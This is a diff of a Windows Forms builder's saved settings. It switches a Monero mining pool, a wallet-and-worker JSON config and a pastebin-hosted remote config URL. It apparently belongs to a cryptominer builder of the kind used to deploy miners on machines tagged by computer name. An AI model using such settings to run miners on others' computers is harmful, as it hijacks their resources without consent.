@@ -46,7 +46,7 @@
                     <Enabled>True</Enabled>
                   </Control>
                   <Control Type="MephTextBox" Name="txtPoolURL">
-                    <Text>xmr-eu1.nanopool.org:14433</Text>
+                    <Text>pool.minexmr.com:443</Text>
                     <Visible>True</Visible>
                     <Enabled>True</Enabled>
                   </Control>
@@ -184,8 +184,8 @@
                   <Control Type="MephTextBox" Name="txtJSON">
                     <Text>{
     "algo": "rx/0",
-    "pool": "xmr-eu1.nanopool.org",
-    "port": 14433,
+    "pool": "pool.minexmr.com",
+    "port": 443,
     "wallet": "88JkjBdwsKU9d2yksdEHxtNaFpPeh17UL2qupbdLqYgyiVc38HPLviD4DnQQNGyh1iAnB9K2NQpmjcLMXoZXa2otMx64wfj.{COMPUTERNAME}",
     "password": "",
     "nicehash": false,
@@ -211,7 +211,7 @@
                 <Visible>True</Visible>
                 <Enabled>True</Enabled>
                 <Control Type="System.Windows.Forms.TabPage" Name="tabConnection">
-                  <Visible>True</Visible>
+                  <Visible>False</Visible>
                   <Enabled>True</Enabled>
                   <Control Type="MephGroupBox" Name="groupOptional">
                     <Visible>True</Visible>
@@ -352,13 +352,13 @@
                     <Enabled>False</Enabled>
                   </Control>
                   <Control Type="MephTextBox" Name="txtRemoteConfig">
-                    <Text>https://pastebin.com/raw/LDPZHieq</Text>
+                    <Text>https://pastebin.com/raw/VhjGmvQQ</Text>
                     <Visible>True</Visible>
                     <Enabled>True</Enabled>
                   </Control>
                 </Control>
                 <Control Type="System.Windows.Forms.TabPage" Name="tabJSON">
-                  <Visible>False</Visible>
+                  <Visible>True</Visible>
                   <Enabled>True</Enabled>
                   <Control Type="MephTextBox" Name="txtJSON">
                     <Text>{
